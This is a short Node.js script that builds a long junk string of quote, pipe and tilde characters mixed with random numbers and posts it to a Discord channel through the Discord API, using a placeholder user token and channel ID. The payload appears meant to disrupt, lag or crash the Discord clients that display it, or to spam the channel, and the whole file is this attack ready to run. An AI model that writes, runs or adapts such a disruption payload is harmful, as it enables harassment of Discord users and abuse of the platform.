//Dependencies
const Request = require("request")

//Variables
var Payload = ""

//Functions
function Payload_Generator(){
    results = ""

    for( i = 0; i <= 51; i++ ){
        results += `||"'||~~|@${Math.floor(Math.random() * 882891618473091082)}|"|"|'|||`
    }

    return results
}

//Main
Payload = Payload_Generator()

Request.post("https://discordapp.com/api/v6/channels/Target_Channel_ID/messages", {
    headers: {
        "Content-Type": "application/json",
        "Authorization": "YourDiscordTokenHere"
    },
    body: JSON.stringify({ "content": Payload })
}, function(err, res, body){
    console.log(err)
    console.log(body)
})
